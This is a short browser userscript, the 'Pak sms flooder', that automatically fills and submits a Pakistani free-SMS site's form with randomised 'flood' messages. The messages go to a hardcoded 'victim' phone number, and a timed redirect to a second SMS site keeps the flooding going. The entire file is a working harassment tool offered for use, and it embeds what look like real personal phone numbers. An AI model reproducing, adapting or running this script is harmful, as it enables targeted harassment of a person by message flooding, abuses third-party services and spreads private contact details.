// ==UserScript==
// @name          Pak sms flooder
// @namespace     Umer Dhamria
// @description   flooder sms
// @include       http://*www.*she*.com.*pk
// ==/UserScript==

var victim=03229730978; //Enter victims number here
var sender=03218297212; //Enter victims number here
var delay=121000; // Enter delay in milliseconds if required


if(document.location=="http://www.she.com.pk/sms/sms.php")
{
document.getElementById('TO').value=victim;
document.getElementById('Your').value=sender;
document.freesms.MSG.value=Math.floor(Math.random()*1456484)+'flood flood flood!!'+Math.floor(Math.random()*1456484);
void(0);
document.freesms.submit();
}

if(document.location=="http://www.she.com.pk/message-accepted")
{
setTimeout('document.location="http://foosms.com/free-sms.php"',delay);
}